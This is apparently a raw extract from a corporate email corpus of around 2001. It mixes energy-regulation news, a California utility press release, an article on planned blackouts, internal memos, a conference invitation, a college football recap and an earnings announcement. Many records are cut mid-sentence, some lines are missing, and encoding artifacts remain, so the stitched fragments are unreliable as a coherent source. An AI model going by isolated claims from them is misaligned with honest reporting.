that sits at the state level -- intrastate pipeline facilities. 
California, she said, needs to assess whether its intrastate system 
is adequate to take gas from the border to its market. ""I am 
worried that where there is insufficient takeaway capacity, FERC's 
actions to increase capacity to the border may result in problems, 
such as prorationing,"" Breathitt said.
     Meanwhile, Breathitt suggested local distribution companies in 
California need the ability to use risk management tools. Policies 
should be in place to give gas buyers an incentive to use such 
tools, including price hedging and the efficient use of storage, she 
said.
     But regulators should be careful in noting the difference 
between hedging to reduce exposure to price volatility and what 
Breathitt called ""mere speculating."" While hedging can be used to 
decrease uncertainty, speculating to beat the market can actually 
increase the possibility of risk, she said.
     Regulators in California and other states should look into the 
benefits of reducing gas buyers' dependence on the spot market. ""A 
balanced portfolio of long- and short-term contracts makes a great 
deal of sense when spot prices are at the extreme levels of the past 
year,"" she said.     CD",Breathitt Linda Breathitt,,"Gas Daily FERC T]here the American

567,"Hi All- 

Enron has decided to outsource our accounts payable department and also 
implement a whole new system for paying invoices.
What this means to all of us is you may receive email(s) from iBuyit 
Payables.  These are very important emails!  These are invoices
that need to be paid.  Any ENA people receiving invoices should automatically 
assume they go to me.  As for Sue's group I think
any invoices you receive will need to go to Joseph.  If you are unsure please 
let he or I know and we can figure out which one of us should
get the invoice.

Here is the irritating part: You can not just forward the iBuyit Payables 
email to me/him.  You must click onto the first link in the email (see 
example below).
Then log on to the iBuyit Payables system using your P00# and log-on password 
(these are the same P00# and password you use to access
eHRonline).  At this point you will be at your iBuyit Payables in-box.  I 
pasted a copy of my in-box below as an example.  There are boxes to check
if you want to forward the invoice.  If you check them all then click on 
'Quick Forward' a forward box will appear.  Type in mine, or Joseph's (if 
it's his
invoice) last name in the 'last name' box, then click search.  From there you 
can click 'Forward'.  I will not only ensure the invoice is paid, but also 
give the vendor the correct information for future invoices.

Please bare with me during this time.  This whole process isn't going to be 
very much fun for any of us.  However, I have made it my priority to have 
this new invoice situation organized as quickly as possible.  If anyone has 
any questions please let me know.  On one last note:  All paper invoices 
should still be given directly to me then I can send them to A/P for scanning.

Thanks,

views--wanted to ensure that all analytic bases are covered.  But I just 
talked to Mike and he and I think, at least preliminarily, that the PUC could 
do this absent legislation.  He's going to do the analysis.  Likely better to 
let Mike go ahead and do the analysis and if we want to get other opinions, 
we can make that decision at that time.

One last thought:  If the PUC could do it, that might be Davis' preference.  
That way, he and his people are in charge.  But it may be difficult 
(impossible) for the Legsilature to resist and Davis may not have the clout 
to get them to back off.

matter here is complicated by the fact that FERC's discovery rules (18 CFR, 
Subpart D) pertain only to ""proceedings set for hearing . . . and to such 
proceedings as the Commission may order.""  18 CFR 385.401.  In this case, 
FERC stated that ""a trial-type hearing is not necessary . . . ."" and 
specifically rejected the use of a ""trial-type evidentiary hearing.""  Slip 
op. at 47-48 & n.97.  Thus, while I have not researched the matter as yet, my 
preliminary view is that the CPUC's attempt to invoke FERC's discovery 
processes would appear to be outside the contemplation of FERC's Nov. 1 order 
and its regulations, unless FERC specifically orders discovery in this case.  
(The CPUC seems to recognize the relevance of this consideration when it 
specifically attempts to equate ""paper"" hearings with ""trial-type"" hearings; 
see page 1 of its Motion.)

The CPUC's motion may prompt FERC to decide whether or not to allow discovery 
in this case under Rule 401.  While the CPUC's motion does not apply directly 
to marketers, FERC's ruling will be precedent in the event the CPUC or 
someone else hereafter serves discovery on other parties.  As a result, we 
need to consider whether laying in the weeds risks losing an opportunity to 
present our views on whether FERC should allow discovery in a paper hearing 
with an expedited decisional track, particularly in light of the fact that 
Staff has already conducted.

>Communications(LVLT:Nasdaq), perhaps the most aggressive of the big,
>money-losing telecommunications service providers floating on a sea of
debt.
>
>Last year, the company lost $1.5 billion after taxes. There are questions

>management continues to reassure investors that the company is ""fully

>Late last month, Level 3 filed to sell $3 billion in new debt securities --
>preferred and common stock to finance working capital and capital
>expenditures. Companies that are fully funded do not typically serve notice
>that they may need to borrow another $3 billion to pay bills and make the
>investments required to stay in business.
>Level 3 matters to investors for a number of reasons. First, because it
>represents the entire New Era telco sector, which has seen more speculative
>money thrown at it than any other high-tech sector in the past five years.
>And that is saying something. If Level 3 runs into financial trouble, you

>Level 3 is also worth paying attention to because there is a staggering

debt.
>It has about $4 billion in cash that it plans to spend real soon. By

>1998. By 2010, cumulative cap ex is expected to top $40 billion. Global
>networks don't come cheap, you know.
>You might reasonably ask, will Level 3 even get to 2003 -- let alone 2010?
>The answer may hinge on whether the company is as fully funded as it claims

>Last November, this column raised questions about Level 3's claims to be
>fully funded. Company management was not pleased.
>Robin Miller, Level 3's vice president for investor relations, wrote in:
>""The fact is that Level 3 is one of the few emerging communications
>companies to be fully funded. Level 3 is fully funded through free cash
flow
>break-even, at which point we are obviously self-funding.""
>Well, on Jan. 18 of this year, ""fully funded"" Level 3 filed its $3 billion
>shelf offering. The stock lost $1.70 a share that day to close at $45.30.
>Today, it closed at $26.56.
>Today, we tried to reach Miller by phone to ask why a fully funded company
>like Level 3 would file a $3 billion shelf offering. She was unavailable,
>but Level 3's director of media relations, Paul Lonnegren, was. He said
that
>the $3 billion filing ""doesn't necessarily mean that the company has any
>intentions or plans to raise the money. ... It doesn't mean that we are
>going to go back to the market for more cash. ... We are confident we can
>get to cash-flow break-even without having to get more money from the
>market. We project cash flow break-even by 2004. ... We did not file to
>raise more money in case we are not fully funded. It was in case the
markets
>bounce back positively enough to make the cost of money attractive. Of

>No, there isn't any sign of the financial markets opening up for the likes

>would have to pay north of 15% -- if it could get the money at all.
>The idea that Level 3 can ease its debt payment problems by borrowing

By Jonathan Stempel
NEW YORK, Oct 29 (Reuters) - Corporate credit quality will likely grow much=
 worse before it gets better, and about $100 billion of corporate debt will=
 likely go into default this year as the United States heads into recession=
, according to reports issued on Monday by two top credit rating agencies.=
=20
Moody's Investors Service said it put ratings on review for downgrade for 1=
22 U.S. companies with $543 billion of debt in the third quarter, dwarfing =
the 22 companies with $66 billion of debt it put on review for upgrade. Rev=
iews are a leading indicator of the direction of corporate credit.=20
""A wide excess of rating reviews for downgrade over upgrades in the third q=
uarter suggests credit deterioration will persist at least into early next =
year,"" said John Puchalla, Moody's senior economist.=20
Meanwhile, Standard & Poor's said more than 200 companies will default on a=
bout $100 billion of debt this year, compared with 117 defaulting on a reco=
rd $42.3 billion in 2000.=20
It said the default rate for junk bonds - those rated ""BB-plus"" or lower by=
 S&P and ""Ba1"" or lower by Moody's because of their credit risks - will rea=
ch 9.4 percent by year end. Moody's forecasts a 10 percent rate.=20
""The U.S. economy is clearly in a recession,"" said S&P Chief Economist Davi=
d Wyss in a statement. ""Although Standard & Poor's expects it to be relativ=
ely mild and end in early 2002, the risk of a longer and deeper downturn is=
 high.""=20
Both agencies said the Sept. 11 attacks contributed to a deepening of a thr=
ee-year slump in corporate credit quality. Moody's blamed 38 reviews for do=
wngrade in September alone on the attacks.=20
COSTS RISE, PROTECTION WEAKENS=20
U.S. corporate credit quality is falling for many reasons.=20
These include the weakening economy, the inability of many marginal compani=
es to raise cash at tolerable interest rates, share buybacks, debt-financed=
 merger activity, and fallout from the attacks on such industries as airlin=
es, insurance and travel.=20
""Many companies in financial difficulties will see their funding sources dr=
y up and be pushed over the brink,"" said David Keisman, managing director a=
t S&P Risk Solutions.=20
Even well-known companies are suffering rating declines.=20
On Monday alone, for example, S&P downgraded McDonald Corp. after the world=
's largest fast-food chain said it will buy back up to $5 billion of stock,=
 at a time S&P said the company's ""growth prospects for the future are less=
 optimistic.""=20
Meanwhile, Moody's downgraded Enron Corp., and warned it may downgrade it a=
gain. The energy trading giant is struggling with vanishing investor confid=
ence, reflected in a share price that has plunged by more than half in two =
weeks, as it tries to keep access to cash it needs to run its business.=20
Puchalla said the credit quality decline could slow next year, in part beca=
use interest rates are low and companies are managing their balance sheets =
more conservatively.=20
""Lower borrowing costs and slowing debt growth should reduce debt servicing=
 costs, and fiscal stimulus from the federal government should boost busine=
ss revenues,"" he said.=20
Still, through Friday, Moody's has said in the fourth quarter it may downgr=
ade 47 companies, and upgrade just four.

FOR IMMEDIATE RELEASE
06/18/2001
GOVERNOR DAVIS ANNOUNCES AGREEMENT WITH SDG&E, SEMPRA ENERGY
$400-$12,000 Per Customer Balloon Payment Eliminated, No Additional Rate
Increases Required to Pay Off Undercollection
SACRAMENTO
Governor Gray Davis today announced an agreement with San Diego Gas &
Electric and the utility's parent company, Sempra Energy, that will erase a
$747 million balloon payment facing the utility's three million customers.
""The balloon is burst,"" Governor Davis said. ""Under this agreement, the
undercollection is eliminated, without any increase in rates. This is a
massive benefit to the San Diegans, the first Californians to bear the brunt
of our state's energy crisis last summer.""
The Memorandum of Understanding (MOU), signed by the Department of Water
Resources for Gov. Davis with Sempra Energy and SDG&E executives while a
group of San Diego ratepayers, and State Senators Steve Peace (D-El Cajon)
and Dede Alpert (D-Coronado) looked on, includes a number of provisions to
eliminate the undercollection that could have cost each customer
approximately $750 (as much as $400 for each residential customer, $1,400
for each small-commercial customer and $12,000 for each medium-sized
commercial customer).
In addition, it would settle several regulatory cases before the California
Public Utilities Commission (PUC), gives the State the opportunity to
purchase 15,780 acres of environmentally-sensitive lands owned by the
company along the Colorado River, and provides below-market power to the
State through December 2010 from the San Onofre nuclear power plant. The
regulatory provisions are subject to PUC approval.
It also calls for the purchase of SDG&E's transmission lines for
approximately $1 billion, or 2.3 times book value. However, the deal is not
contingent on that purchase of SDG&E's transmission network, which includes
170 electric lines exceeding 69 kilovolts in capacity and spans
approximately 1,800 circuit miles from southern Orange County to the Mexican
border. The system also includes about 135 electric substations and
transmission interties with Southern California Edison's system at the San
Onofre Nuclear Generating Station.
""Throughout these long and complex negotiations, Governor Davis and we have
had the mutual objective of reducing the financial impact of California's
crisis on SDG&E's customers and helping the State gain more control over its
energy destiny,"" said Stephen L. Baum, chairman, president and chief
executive officer of Sempra Energy. ""Today's agreement represents a winning
proposition for our customers, the State and our company: it reduces the
future financial burden on our customers, protects the State's economic
future, and creates a clear path for future growth and profitability for our
company. Going forward, we are committed to working with Governor Davis and
the State to implement his recovery plan.""
The MOU signed today is the second with California's investor-owned
utilities. An agreement with Southern California Edison is pending approval
before the State Legislature. Unlike the Edison agreement, however, the MOU
with Sempra Energy does not need legislative approval (except for the
acquisition of transmission lines).
""This is an example of the good that can come when parties are responsible
and remain at the bargaining table,"" Governor Davis said. ""This is a
balanced business transaction that benefits ratepayers and provides a stable
environment for the State's third largest utility.""
Governor Davis said the MOU will not result in any additional
electric-base-rate increases for SDG&E customers to recover the $750 million
undercollection. Without the MOU, future balloon payments to recover this
sum could have been as much as $750 per customer.
The regulatory balancing account for SDG&E's undercollected power costs had
grown to approximately $750 million since September 2000, when the State
imposed a retail rate cap of 6.5 cents per kilowatt-hour, retroactive to May
2000. California state law AB 265, signed by Governor Davis last year,
provided for SDG&E's recovery of all its prudently incurred power costs, but
delegated responsibility to the PUC for determining the method and timeline
for recovery.
The agreement includes a complex package of elements to eliminate the
balloon payment, such as the settlement of the reasonableness-review case
SDG&E had with the PUC. To settle that case, the utility has agreed to
forego collecting $100 million of the balancing account.
In addition, the agreement notes that:
SDG&E agrees to give back 90 percent of the profits on two long-term power
contracts earned since the energy crisis flared last June. That means SDG&E
will forego collecting another $219 million in the balancing account. (The
California Department of Water Resources will purchase those contracts as of
June 1.);
SDG&E and its sister utility, SoCalGas, will invest at least $3 billion over
six years into capital improvements. In addition, if the State decides not
buy the transmission lines (and
SDG&E builds the Valley Rainbow line) the utility, backed by Sempra Energy,
will put another $500 million into transmission line improvements, subject
to PUC approval). Excluding the transmission system improvements, this is an
increase of $600 million more than the utilities invested in capital
improvements in the previous five years; and
SDG&E will drop all legal claims against the State.
""We know that many of our customers are extremely concerned about the
potential of large balloon payments looming in the future to address our
past undercollections,"" said Edwin A. Guiles, group president of Sempra
Energy's regulated business units and chairman of SDG&E. ""We are pleased
that today's agreement provides the framework to resolve major regulatory
issues to the benefit of our customers. Many challenges remain, but, this
agreement demonstrates that, by working together, we can surmount these
challenges in a way that benefits all the key stakeholders in California's
energy future.""
The MOU also calls for the Department of Water Resources (DWR) to continue
to buy power for SDG&E through the agency until certain conditions are met.
DWR has been purchasing power for SDG&E customers since early February.
SDG&E is a regulated utility operating in San Diego and southern Orange
counties. Sempra Energy (NYSE: SRE), based in San Diego, is a Fortune 500
energy services holding company with annualized 2001 revenues of about $13
billion. Through its eight principal subsidiaries - Southern California Gas
Company, San Diego Gas & Electric, Sempra Energy Solutions, Sempra Energy
Trading, Sempra Energy International, Sempra Energy Resources, Sempra
Communications and Sempra Energy Financial - the Sempra Energy companies'
12,000 employees serve more than nine million customers in the United
States, Europe, Canada, Mexico, South America and Asia. ",DAVIS Gray Davis Davis Steve Peace Dede Alpert Stephen L. Baum Edwin A.

(Published May 23, 2001)=20
If Californians are to be left in the dark, they should at least know when =
to=20

That's the growing sentiment among a range of elected officials, including=
=20
Gov. Gray Davis, who are pushing the idea of planning power blackouts and=
=20
giving businesses and residents ample warning.=20
On Tuesday, the Democratic governor's office said Davis supports longer=20
public notice than the 24 hours called for under a proposal by the Californ=
ia=20
Independent System Operator, which runs the state's power grid.=20
Assemblyman Mike Briggs, R-Fresno, introduced a bill that would lay out a=
=20
blackout schedule for the summer. Businesses could make plans for the=20
possible blackout days and also be assured that on all other days the light=
s=20
would stay on.=20
Briggs called his plan an improvement on the existing system in which ""ever=
y=20
day is a potential blackout day.""=20
A Senate committee, meanwhile, discussed planned blackouts as part of a=20
strategy to gain leverage over electricity generators by declaring that the=
=20
state will not pay above a certain amount for power. The state would ask=20
Washington and Oregon to join the so-called ""buyers' cartel.""=20
If the power generators refused to sell at the lower prices, the state woul=
d=20
gut it out with planned blackouts.=20
""Let's use the blackouts against the generators,"" Michael Shames, head of t=
he=20
San Diego-based Utility Consumers' Action Network, told the Energy, Utiliti=
es=20
and Communications Committee. But Shames and others stressed the need for=
=20
warnings of at least 12 hours and blackouts no longer than 90 minutes.=20
""Absent that management of blackouts, we don't see how the buyers' cartel=
=20
could work,"" Shames said.=20
On a visit to Chicago on Monday, Davis said he talked to officials about th=
e=20
city's system for giving the public warning days before possible power=20
blackouts, with definite notice right before.=20
""There is no reason to keep that secret from the public when their safety i=
s=20
likely to be jeopardized,"" Davis told reporters Tuesday. The governor said =
he=20
plans to meet in the next few days with managers at ISO to explore the idea=
=20
of a system like Chicago's.=20
The grid operator announced Monday that it will try to give the public at=
=20
least a half-hour notice of outages, but many officials said Tuesday the=20
public needs even more warning. Davis aides said the governor's plan will g=
o=20
beyond ISO's.=20
There are potential pitfalls. Criminals might make their own plans, taking=
=20
advantage of deactivated alarms. And some say that a schedule of blackouts=
=20
might increase the number of outages.=20
If people have been warned that a blackout is coming, and a last-minute=20
supply of electricity makes it unnecessary, grid managers would have to=20
decide whether to call it off, said Dorothy Rothrock, vice president of the=
=20
California Manufacturers & Technology Association.=20
If they did, it would add uncertainty to future warnings, she said, possibl=
y=20
leading them to order unnecessary blackouts.=20
""Obviously, there are trade-offs,"" Rothrock said.=20
Still, the idea of planning blackouts seems to be gaining ground as a way f=
or=20
the state to get back some control of the energy crisis, sorely lacking in=
=20
recent months.=20
""It would help us as Californians to say, 'The hell with you, George Bush,=
=20
we're going to handle this ourselves,' "" said Jim Overman, 68, of Elk Grove=
.=20
Overman said he has been burning up the phone lines trying to persuade anyo=
ne=20
who will listen that scheduled blackouts will make everyone's lives easier.=
=20
Briggs said he has been told by constituents, including irrigators and food=
=20
processors, that scheduled blackouts are the way to go.=20
Irrigators would know that they shouldn't plan on getting water on a day th=
at=20
their electronic gates might be closed.=20
Businesses could tell workers to stay home on a blackout day, or arrange fo=
r=20
backup power generators, he said.=20
""We would be very interested in it,"" said Ed Yates, senior vice president o=
f=20
the California League of Food Processors.=20
Power blackouts are chaotic for processing plants, Yates said, requiring so=
me=20
plants to be re-sterilized and shutting down operations for more than a day=
.=20
Some processors might choose to close on days when they faced a blackout, h=
e=20
said, losing revenue but avoiding the loss of thousands of pounds of food.=
=20
""It doesn't solve the problem, but it helps manage a very difficult=20
situation,"" he said.=20
Briggs said that his plan would result in possible blackout days every two=
=20
weeks. The plan would assume that a certain number of customers would have =
to=20
turned off to keep the grid operating. If the electricity shortage went abo=
ve=20
that amount, people might still face unanticipated blackouts, Briggs said.=
=20
One question is public safety. Some are queasy about burglars knowing when=
=20
blackouts will occur. But pluses include the ability to arrange for tempora=

""If the police have only five minutes notice, they can't get to difficult=

The manufacturers' association and other business groups haven't endorsed t=

To increase earnings and, correspondingly, the stock price, I recently met=
=20
with various Government Affairs group heads to discuss ways Government=20

accounts in San Diego (20,000 state wide), we could stand to be charged 
upward of about $750,000 additionally annually, based on San Diego's filing.  
This assumes roughly $100 of additional costs per account per year over an 18

607,"Jeff, my understanding is that, various level of emergencies are declared by 
the CAISO because of power supply situations.   Rotating outage plans are 
then required to be implemented by the Utilities in order to reduce their 
power supply requirements (i.e. electric loads).   The utilities chose to 
implement their Rotating Outage Plans by dropping various distribution 
circuits, that do not have essential customers connected to them, on a 
rotating basis because it is cheap and easy to implement, less controversial, 
and less politically sensitive.

The following are my comments:
My main concern is with regards to the way they propose to handle Direct 
Access customers.   Direct Access customers should not be included in PG&E's 
Mandatory Curtailment Plan (MCP) because the power that these customers are 
using is not coming from PG&E anymore.   Their power supply requirements are 
being met by their ESP's.
PG&E's proposal is treating transmission level customers like utilities.   
The only difference, this time, is that PG&E is acting like the regulator 
(controlling the customer).
At a minimum, the cost of implementing their proposal should be paid for by 
PG&E and not the transmission customers.
Non-firm customers, such as IBM, should not be included or be required to 
participate in their MCP anymore because their loads are dropped down to the 
minimum or essential levels, by the CAISO first, even before a state of 
emergency is declared.   There is a minimum load level that facilities 
require in order to maintain human and environmental safety conditions.

Please give me a call if you have any question.

Thanks

Tim, I know Jeff knows all about the conference we are organizing and I hope
you do as well.

Rob, I and the rest of the conference organizers are wondering if you could
help us find out if Jeff Skilling from Enron would be willing to be one of
our panelists? He has been an articulate critic of the current state of our
electricity markets, and we definitely would like the genco perspective
represented.

Naturally we are hoping to get a quick answer because our publicity about
the conference will be going out shortly.

A brief description of the conference is appended below. Please let me know
if you need any additional information.

Thanks very much for your help and advice.
Lee

The summer of San Diego has prompted the School, in collaboration with UC's
Energy Institute and Competition Policy Center, to sponsor a high-level
summit conference on electricity deregulation. The focus, and the audience,
will be national, but heavily informed and influenced by the California
crisis.  The conference will evaluate (1) the wisdom of deregulation and (2)
how the pitfalls encountered so far can be avoided and remedied. The
University will facilitate an open, honest and reasoned exchange between
executive-level players from various perspectives: industry, regulators,
consumers, legislators, academics, and market and system operators.

The format entails two roundtable discussions with six speakers and a
moderator.  During the panel sessions, the speakers will engage in a
debate/dialogue on the current situation in electricity deregulation, where
we have come from, what the future holds, and what solutions lie on the
horizon. Each speaker will have uninterrupted time to speak, followed by Q&A
and discussion.  We expect a live audience of about 200, including a large
press presence.  One sponsor has tentatively offered to provide internet
streaming video services.  We hope to have a balanced group of sponsors
ranging from the American Public Power Association to energy companies.

The speakers are being arranged at this time. We have commitments from:
Loretta Lynch (Chair, CPUC), and PJM CEO Phil Harris. We have a preliminary
acceptance from Steven Littlechild (England's former primary electricity
regulator) and Laura Tyson (former Chair, President's Council of Economic
Advisors and National Economic Council, currently Dean, Haas School of
Business). We have invited FERC Commissioner Curt Hebert, and U.S.
Representative Edward
Markey, executive-level managers from several energy companies and state
legislators. Former DOJ chief economist Carl Shapiro will be on one of the
panels, as will economist Severin Borenstein, Director of UCEI and Professor
of Business and Public Policy. Michael Florio from The Utility Reform
Network (TURN) will be a consumer advocate on one of the panels. Lee
Friedman, economist and Professor of Public Policy, will briefly provide an
introduction to the panel discussions with his talk ""Lighting the Stage: The
Electricity of Deregulation.""

A dinner for the panelists and organizers will be hosted at UC's Goldman
School of Public Policy following the conference proceedings. We have
reserved rooms for our speakers at Berkeley's landmark Claremont Hotel. We
can reimburse those speakers who request it for coach airfare expenses and
other ordinary local expenses.

Late, Great Rally Comes Up Short at Stanford;
Texas Falls From No. 5 to No. 15 After Loss

The Longhorns couldn't run, couldn't protect the quarterback, got a punt
blocked for a Stanford touchdown, and still almost won the game against the
defending Pac 10 champion Cardinals.
But they didn't. Stanford won a 27-24 verdict with a late touchdown that
negated a 15-point fourth-quarter Texas rally.
Coach Mack Brown praised the Longhorns' fight, and they did fight, and he
said the team can build on the loss because it showed the young players the=
y
have a chance to win tough games on the road.
""We tried,"" he said. ""This one was tough because of the mistakes we made. W=
e
came back and had a chance to win it with those two big fourth quarter
drives. We just came up a little short.""
Brown said the team has to work hard to improve. He didn't single out the
offensive line as a unit that needs to improve, but, while the receivers
dropped some ball, the quarterbacks missed some open receivers and the
defense bent more than it should, the one constant negative this year has
been an inability to run the football.
After playing two teams who are not very good at stopping the run, the
Longhorns are last in the Big 12 and No. 112 of 114 Division I football tea=
ms
in average rushing yardage per game at 50. In two games, they have 100 net
rushing yards.
The Longhorns actually ran the ball better against Stanford than they did
against a weak Louisiana-Lafayette team in their opening 52-10 win, but the
Cardinal defenders had five sacks to cut into the net figure.
I have been predicting a very good season, and Brown has been saying the te=
am
has some problems and must get better to accomplish its goals. He's right a=
nd
I'm wrong. Let's just hope he and his assistant coaches can work out the
problems in the offense in time to let the team accomplish its goals.
The victory gave Stanford, a 14-point underdog, a 2-1 record, while the
Longhorns fell to 1-1.
Here, briefly, is how the game went:
FIRST QUARTER
Stanford won the toss and took the ball. After an exchange of punts, Stanfo=
rd
drove to midfield, but backup DE Maurice Gordon sacked QB Randy Fasani and
Fasani suffered an injured ankle and had to leave the game. He was replaced
by sophomore Chris Lewis. A face-mask penalty on a bad Stanford punt negate=
d
that punt and gave Stanford a first down at the 47 and the Cardinal took
advantage of that Longhorn miscue, scoring in four plays with Lewis hitting
WR Luke Powell behind Quentin Jammer for the final 37 yards to put Stanford
ahead, 6-0, with 6:06 left in the quarter. DE Cory Redding blocked the extr=
a
point. Ivan Williams ran the kickoff back to the 22. Texas drove to the
Stanford 43 before stalling. Kris Stockton got off a great punt that kicked
out of bounds at the Stanford 2. A fumbled snap pushed Stanford inside the =
2,
then Redding and DT Casey Hampton led a surge that trapped FB Casey Moore i=
n
the end zone for a safety with 1:14 left, leaving Stanford on top, 6-2. Chr=
is
Simms came in at QB for Texas and the Horns were at midfield as the period
ended.
SECOND QUARTER
Simms hit freshman WR Roy Williams down the middle for a 37-yard touchdown
strike on the third play of the quarter. Williams broke an attempted tackle
by CB Ryan Fernandez at the 21 and strolled in for the score. Stockton's ki=
ck
put Texas on top, 9-6, with 13:59 left. Applewhite relieved Simms midway
through the period. Neither team threatened again until Stanford drove 67
yards, primarily on two big pass plays, to take a 13-9 left with 4:49 left.
Neither team threatened again before intermission.
THIRD QUARTER
Texas got the ball first, but failed to make a first down and had to punt. =
A
horde of Stanford defenders poured through and blocked it and backup FB Emo=
ry
Brock covered it in the end zone for a touchdown, putting Stanford up, 20-9=
,
just one minute deep into the second half. The rest of the quarter was a
defensive struggle, with each team making only one first down.
FOURTH QUARTER
Applewhite hit WR Montrell Flowers for 19 yards on the second play of the
fourth quarter to revive the long dormant UT offense and get the Horns
started on a drive that enabled them to get into Stanford territory for the
first time in the second half, but a holding penalty and then a sack pushed
the Horns back and killed the drive. With 9:39 left and Longhorn fans
everywhere beginning to despair, Texas, starting from its own 29, got back =
in
the game on one huge play. Applewhite found freshman WR B. J. Johnson behin=
d
all the defenders and hit him for a 71-yard scoring strike. The Horns decid=
ed
to go for a 2-point conversion and, after a pass interference penaty put th=
e
ball on the 1, Mitchell went over the top to get the two-pointer and cut th=
e
Stanford lead to 20-17 with 9:29 left. The Texas defense, again forced
Stanford to punt quickly. Mitchell returned the punt to the Texas 41.
Applewhite hit TE Mike Jones for 25 yards to the Stanford 34, but, under a
big blitz, he was intercepted at the Stanford 4 with 7:46 left. Stanford
punted with 6:42 left, and Mitchell made a great punt return, dashing 48
yards to the Cardinal 18, but a holding penalty on the return pushed the
Horns back to the 38. Backup TB Victor Ike was stopped for no gain and
Applewhite threw an incomplete pass and to bring up third-and-10. Ike raced
down the left sideline and caught Applewhite's long throw just behind a
Stanford defender and sprinted in for the TD, putting Texas ahead, 24-20,
with 5:44 left. Stanford got a good kickoff return to the Cardinal 46, but
couldn't move and had to punt, giving Texas a chance to run the clock out
with 5:44 left. A couple of first downs would have done it, but two
false-start penalties left the Horns in a hole. They made 19 yards in three
plays, but faced a fourth-and-1 at their own 29 and had to punt. Stanford,
held in check throughout the second half by the Longhorn defense, started i=
ts
drive with 1:55 left. The Cardinal scored in five plays, with Lewis hitting
WR DeRonnie Phipps for 30 yards to the Texas 29. The Longhorns were called
for roughing the passer and a penalty to the 15 was tacked on. After an
incompletion, Lewis found Pitts again and he barreled over for the winning =
TD
with 1:12 left. Texas had enough time to come back, but the Stanford defens=
e,
which already had three sacks, got two more in that final minute to finish
off the Longhorns.
Notes . .
* The Longhorns haven't rushed for 100 net yards in their last five games.
They are 1-4 in those games, with the lone victory being the season opener
against Louisiana-Lafayette.
* The Texas' defense allowed Stanford only one first down in the third
quarter and only two in the fourth quarter, until the Cardinal's winning
drive in the final two minutes.
* Texas had 18 possessions. Three of them resulted in touchdown, two ended
with pass interceptions, 12 ended with punts and the one at the end of the
game ended on downs after Applewhite was sacked twice.
* Texas' three touchdown plays accounted for 149 of the Longhorns 343 total
net yards. It was a feast-or-famine kind of game for the UT offense, which
only three other plays that gained more than 12 yards.

Coach's Corner

Coach Mack Brown was tired Sunday afternoon for his weekly post-game news
conference. The team plane left Palo Alto at 3 a.m. Texas time and got back
to Austin around 7 a.m.
But he was fairly upbeat. ""You always hate to lose,"" he said, ""but if you
have to lose, you ought to lose early. If you're going to lose, it ought to
be out of conference.""
He said the only thing the lose really costs the Longhorns is a chance at
going undefeated, ""and we're not a national championship caliber team, in m=
y
opinion.""
He said the Horns can still accomplish a lot. ""Look at Stanford last year,""
he said. ""You never want to lose a game, but Stanford wins the Pac 10 last
year after they leave here with an embarrassing loss.""
Brown said nothing went the Longhorns' way in Palo Alto. ""It was a night th=
at
nothing worked for us, but the positive thing is that we still had a chance
to win.""
No one asked him about his starting quarterback because he says he has two
starters, but it appears Major Applewhite is back in the saddle. He started
Saturday night and was the quarterback on 14 of UT's 18 possessions.
Sophomore Phil Simms got the other four possessions.
He can't comment on officiating without getting in trouble with the Big 12
office, but there were a lot of penalties against the Longhorns that came a=
t
crucial times, like the flagrant face-mask call that negated Stanford's pun=
t
on a fourth-and-25 and gave the Cardinal an automatic first down en route t=
o
their first touchdown. The Longhorns also had two false start penalties whe=
n
they were trying to run out the clock with a 24-20 lead. They gained 19 yar=
ds
on their three plays that stood up, but that left a yard short and they had
to run.Then there was a roughing-the-passer penalty on Stanford's winning
drive in the final two minutes.
While Brown couldn't comment after the game, he had several animated
discussions with the officials during the action.
Without commenting on the officiating, he said, ""They got a holding call on
an incomplete pass on third down on one touchdown. The face mask penalty le=
d
to a score. There was a late hit call on the quarterback on their last
(scoring) drive. Those things just abolutely kill because just about every
one led to points for them.""
Brown said the Longhorns didn't use their shotgun formation with four
wideouts more because ""we weren't throwing the ball and catching it very
well. That's something we would have done more if we had done better at it.=
""
""We didn't have a good night throwing the ball overall,"" he said. ""We had
some drops, we had some passes that missed and we had some young receivers
who were playing on the road for the first time. Montrell Flowers was the g=
uy
who played the best among the wide receivers, and he's the most experienced=
.
It was a combination of errors on our passing game. We were just not smooth=
.""
Brown was asked about the team's performance in specific area that have
caused problems in the past and have gotten special attention, like the
offensive line and the special teams.
He said, ""After looking at the tape, the offensive line played better than =
we
thought. The blitzes were our big problem. It looked worse than it was. I
feel like we've made some progress with our offensive line. We've got to ke=
ep
working on that. I think the special teams have improved a lot. We had some
kickoff returns and Hodges (Mitchell) had the good punt return, but we had =
a
blocked punt for a touchdown. We had to punt a lot, but that blocked punt
really bothers me. We can't have one, no matter how many times we have to
punt. That's the part they have to focus on.""
He said Texas has to bounce back quickly from the long, tiring road trip,
coupled with the loss.
""Our guys are totally exhausted. We got back at 7 a.m. (Sunday). That's why
we didn't go to Hawaii =01) because we knew it would be a hard game and a l=
ong
trip.""
""Our team played really hard. This was tough because we played so hard, but
had too many mistakes. But our kids fought all the way. That's what we have
to build on. We've got another game Saturday.""
""Houston is not going to care about our loss,"" he said. ""It'll probably
excite them. We can sit around and mope or we can get ready to play again.
This was a little eye opener for us to get better and move forward.""
He said players and coaches can't get as up or down as fans because they kn=
ow
they have to get ready to play another game and can't dwell on a win or a
loss until the season is over.
""That's the least of my worries,"" he said. ""They really tried. When you
really try and you can come back on the road and have a chance to win, that=
's
something that's a positive to build on.""
He said this game will help the team later on because it was a game the Hor=
ns
could have won on the road against a good team.
""We just made too many mistakes,"" he said. ""That's something we can correct=
.
If we had a team that didn't care, that it didn't both to lose, that's the
worst thing that can happen to you as a coach, but that's not the problem.""
After the game Saturday night, Brown said most of the players were so upset
they were crying.
""We can build on this,"" he said. ""We have a really young football team. We'=
ll
come back and get better. We can correct the mistakes.""
""We took a big step in these big games by just hanging in there and hanging
in there. As long as they'll fight, you can coach them, and they fought all
the way. It was mistakes that cost them, not their effort, and that can be
fixed. We made three or four mistakes that probably cost us the game.""
Brown said the bottom line is ""we're a young team and we will get better.""
INJURY UPDATE: Brown said safety Lee Jackson has a strained hamstring and
linebacker Marcus Wilkins has a sore groin. He said those appeared to be th=
e
only injuries sustained in the Stanford game and both players are expected =
to
be back at practice by the middle of the week.

659,"
Today, we announced our third quarter earnings results, which were right on target with analysts estimates for recurring earnings per diluted share of $0.43.  This marks a 26 percent increase over the third quarter of last year, which is due to the strong performance of our core wholesale and retail energy businesses and our natural gas pipelines.  In addition, we also announced that we are on track for our earnings target of $0.45 for the fourth quarter ($1.80 for 2001) and $2.15 for 2002.

